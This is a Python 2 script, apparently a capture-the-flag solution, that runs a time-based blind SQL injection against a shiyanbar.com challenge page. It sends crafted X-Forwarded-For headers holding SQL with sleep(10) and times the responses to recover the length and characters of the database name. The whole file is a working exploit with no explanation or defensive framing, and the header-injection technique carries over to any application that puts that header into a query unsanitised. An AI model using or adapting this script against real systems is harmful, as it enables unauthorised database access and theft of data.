#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import time

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'
url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'

print 'starting to guess database name length.'

for i in range(1,256):
        time_1 = time.time()
        headers = { "Host":"ctf5.shiyanbar.com","X-Forwarded-For":"127' AND ( SELECT * FROM ( SELECT ( case when ( length(database())=" + str(i) + " ) then sleep(10) end )) Hi ) or '1=1" }
        res = requests.get( url, headers=headers )
        if time.time() - time_1 > 8:
            dbname_length = i
            break

print 'starting to guess database name.'
db_name = ''

for i in range(dbname_length):
    print 'database: ',db_name
    for payload in payloads:
        time_1 = time.time()
        headers = { "Host":"ctf5.shiyanbar.com","X-Forwarded-For":"127' AND ( SELECT * FROM ( SELECT ( case when ( database() like '" + db_name + payload + "%' ) then sleep(10) end )) Hi ) or '1=1" }

        res = requests.get( url, headers=headers )
        if time.time() - time_1 > 8:
            db_name += payload
            break
        else:
            print '.'

print 'database: ',db_name
